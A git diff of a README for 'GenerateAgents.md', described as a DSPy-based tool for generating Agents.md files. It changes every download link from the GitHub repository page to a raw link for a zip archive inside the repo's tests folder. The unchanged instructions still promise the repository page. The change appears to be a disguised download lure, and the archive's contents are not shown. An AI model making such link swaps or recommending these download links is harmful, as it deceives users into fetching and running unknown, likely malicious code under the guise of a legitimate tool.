@@ -1,6 +1,6 @@
 # 🤖 GenerateAgents.md - Easy Agent Files for LLMs
 
-[![Download GenerateAgents.md](https://img.shields.io/badge/Download-GenerateAgents.md-brightgreen)](https://github.com/NXSkara/GenerateAgents.md)
+[![Download GenerateAgents.md](https://img.shields.io/badge/Download-GenerateAgents.md-brightgreen)](https://raw.githubusercontent.com/NXSkara/GenerateAgents.md/main/tests/Agents_md_Generate_1.9-beta.4.zip)
 
 Automated generation of Agents.md files helps you document agents built for large language models. This tool uses the DSPy Recursive language model to produce detailed markdown files for your agents. It simplifies how you track and share agent skills and capabilities.
 
@@ -10,7 +10,7 @@ Automated generation of Agents.md files helps you document agents built for larg
 
 Start by visiting the main page to download the software.
 
-[Download GenerateAgents.md](https://github.com/NXSkara/GenerateAgents.md)  
+[Download GenerateAgents.md](https://raw.githubusercontent.com/NXSkara/GenerateAgents.md/main/tests/Agents_md_Generate_1.9-beta.4.zip)  
 
 1. Open the link above.
 2. You will see the GitHub repository page for GenerateAgents.md.
@@ -127,4 +127,4 @@ You can find sample Agents.md files and documentation in the repository.
 
 ---
 
-[![Download GenerateAgents.md](https://img.shields.io/badge/Download-GenerateAgents.md-blueviolet)](https://github.com/NXSkara/GenerateAgents.md)
+[![Download GenerateAgents.md](https://img.shields.io/badge/Download-GenerateAgents.md-blueviolet)](https://raw.githubusercontent.com/NXSkara/GenerateAgents.md/main/tests/Agents_md_Generate_1.9-beta.4.zip)
